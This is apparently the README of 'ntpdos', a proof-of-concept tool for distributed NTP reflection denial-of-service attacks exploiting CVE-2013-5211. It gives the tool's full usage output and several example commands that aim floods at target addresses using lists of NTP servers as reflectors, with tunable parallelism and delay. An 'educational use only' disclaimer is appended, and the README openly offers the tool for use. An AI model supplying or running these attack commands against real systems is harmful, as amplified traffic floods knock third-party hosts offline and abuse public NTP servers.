# ntpdos

PoC for distributed NTP reflection DoS (CVE-2013-5211).

## Usage

```
$ ./ntpdos -H
--==[ ntpdos by sepehrdad ]==--

usage:

  ntpdos -t <addr> -s <addr> [options] | [misc]

options:

  -t <addr>    - target ip address
  -T <file>    - list of target ip addresses
  -s <addr>    - ntp server ip address
  -S <file>    - list of ntp server ip addresses
  -p <num>     - number of parallel processes (default: 80)
  -d <num>     - delay in microsecs (default: 1000)

misc:

  -V           - show version
  -H           - show help

example:

  # Attack 127.0.0.1 with servers from servers.lst
  $ ntpdos -t 127.0.0.1 -S servers.lst

  # Attack targets from targets.lst with 192.168.2.11 server
  $ ntpdos -T targets.lst -s 192.168.2.11

  # Attack targets from targets.lst with servers from servers.lst
  $ ntpdos -T targets.lst -S servers.lst

  # Attack 1.2.3.4 with 5.6.7.8 using 200 parallel processes
  $ ntpdos -t 1.2.3.4 -s 5.6.7.8 -p 200

  # Attack 1.2.3.4 with 5.6.7.8 with 1 microsec delay
  $ ntpdos -t 1.2.3.4 -s 5.6.7.8 -d 1

notes:

  * list of ip addresses should have 1 ip address per line

```

## License

This software is distributed under the GNU General Public License version 3 (GPLv3)

## LEGAL NOTICE

THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.

## Get Involved

**Please, send us pull requests!**
